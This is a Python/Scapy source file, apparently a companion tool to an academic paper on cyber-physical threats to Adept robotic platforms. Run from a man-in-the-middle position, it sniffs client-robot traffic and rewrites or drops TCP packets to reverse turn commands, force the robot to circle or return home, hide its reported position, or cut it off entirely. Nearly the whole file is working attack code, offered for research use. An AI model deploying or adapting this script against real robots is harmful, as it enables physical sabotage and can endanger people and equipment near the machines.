
#This code is developed by Khalil M. Ahmad Yousef, Anas AlMajali, Salah 
#Ghalyon, Waleed Dweik, and 
#Bassam J. Mohd as a companion to their paper:
#Analyzing Cyber-physical Threats on Robotic Platforms, which is 
#currently under review.

#This work has been done at the computer engineering departmnet 
#at the Hashemite University, Zarqa, Jordan.

#If you use this code in project that results in a publication, 
#please cite the paper above. 

#The following commnets cover the type of attacks or threats that can be 
#perofrmed using this tool on Adept robotic platforms.

#May 3, 2018

#Comments/Bugs/Problems: khalil@hu.edu.jo, almajali@hu.edu.jo 
#and salah.g.ghalyon@hu.edu.jo 

#Required library:

#Scapy

#Made Assumption(s): 

#An attacker has successfully succeeded in performing 
#man-in-the-middle (MITM) attack,
#say using ARP (Address Resolution Protocol) spoofing, on the 
#robot network. Thus, this tool will
#run on the MITM attacker machine to perform the attacks 
#presented in the paper and listed below.

#To use the RAT tool, an attacker should be able to successfully 
#perform a MITM attack. 
#After which, the RAT tool sniffs the packets streamed over the 
#network. Based on the 
#direction of the traffic (robot to client and client to #robot ), the RAT tool accepts five states
#that indicate the type of the attack, which are assigned to 
#variable named as \textbf{State}. 
#The first fours states represent integrity attacks, and the 
#last one represents an availability attack.
#These states are described as follows: 

#	States of integrity attacks
#		mirror: reverse the direction of the movement of the 
#			  robot;  change right command to left, and left 
#			  command to right. 
#		send_to_position: replace any command by a command 
#				that forces the robot to go to a certain 
#				position of the attacker's choice. 
#		circulate: replace any command by a command that 
#				forces the robot to circulate in one 
#				direction (left). 
#		fake_position: change the correct position sent by 
#					the robot to the client. 
#	State of an availability attack:
#		availability_attack: drop the packets in any 
#				direction between the client and the robot 
#				rendering the robot unavailable.


from scapy.all import *
import sys
import os
import time


dir=0
state=0
timer=0
temp=''
print ("*****************************\nWelcome to RAT Tool:\n*****************************")
print (" For Mirror attack enter 1,\n For Circulate attack enter 2,\n For send_to_position attack enter 3,\n For availability attack enter 4,\n For fake_position attack enter 5")

state=input("your choice is:")

def pkt_callback(packet):
	global timer 
	global dir
	global state
	global temp
	me = "192.168.1.35" # spoofed source IP address
	robot = "10.239.51.86" # destination IP address
	client = "192.168.1.31" # destination IP address
	right="\x0f\x0c\x15\x00m\x010\x00-100\x00100\x000\x00\xc4\x1a"
	left="\x0f\x0c\x14\x00m\x010\x00100\x00100\x000\x00b\x8f"
	home="........"
		
	if(packet[0][1].src==client and packet[0][1].dst==me):
		
			
		Robot_port =packet[0][1].dport
		client_port=packet[0][1].sport;
		
			    
		if(TCP in packet):
			
	   	    spoofed_packet = IP(src=me, dst=robot)  /packet[TCP]
		    if (state!=4):			#not Availability attack, if availability attack nothing will be sent to the robot like if it is unreachable
				if  (state==1):		#Mirror attack
					if (timer==0):
						temp=raw_input("Start the attack now??(Y/N)")
						if (temp=='Y'or temp=='y'):
							timer=-1
						else: 
							timer=250
					elif (timer>0):
						timer=timer-1
						
					elif (timer==-1):
							if( (str(packet[TCP].payload).encode("HEX")) == (str(left).encode("HEX"))):
								spoofed_packet[TCP].remove_payload()
								spoofed_packet=spoofed_packet/right
							elif ( (str(packet[TCP].payload).encode("HEX")) == (str(right).encode("HEX"))):
								spoofed_packet[TCP].remove_payload()
								spoofed_packet=spoofed_packet/left
							
				elif (state==2):	#Circulate attack
					
					if (timer==0):
						temp=raw_input("Start the attack now??(Y/N)")
						if (temp=='Y'or temp=='y'):
							timer=-1
						else: 
							timer=250
					elif (timer>0):
						timer=timer-1
						
					elif (timer==-1):
						spoofed_packet[TCP].remove_payload()
						spoofed_packet=spoofed_packet/left		#Make all the commands turn left commands.
				elif (state==3):
					if (timer==0):
						temp=raw_input("Start the attack now??(Y/N)")
						if (temp=='Y'or temp=='y'):
							timer=-1
						else :
							timer=250
					elif (timer>0):
						timer=timer-1
					elif (timer==-1):
						spoofed_packet[TCP].remove_payload()
						spoofed_packet=spoofed_packet/home		#Sends the robot to where it started up 
						
					
				del spoofed_packet[TCP].chksum				#enforce the checksum to be recalculated according to the new payload
				send(spoofed_packet)
				
			   
	if(packet[0][1].src==robot and packet[0][1].dst==me):
		
		Robot_port =packet[0][1].sport
		client_port=packet[0][1].dport;
		
			    
		if(TCP in packet):
			   
  			spoofed_packet = IP(src=me, dst=client) /packet[TCP]
			if (state!=4):								#if availability attack is active no response will be sent to the client like if the robot is not available 
					if (state==5):									#Fake position attack
						if (timer==0):
								temp=raw_input("Start the attack now??(Y/N)")
								if (temp=='Y'or temp=='y'):
									timer=-1
								else :
									timer=250
						elif (timer>0):
							timer=timer-1
						elif (timer==-1):
								spoofed_packet[TCP].remove_payload()		#No updates about the location will be sent to the client, He will think the robot is still on the old X,Y
							
					del spoofed_packet[TCP].chksum
					send(spoofed_packet)
		  			  	
sniff( prn=pkt_callback,filter="ip",  store=0)

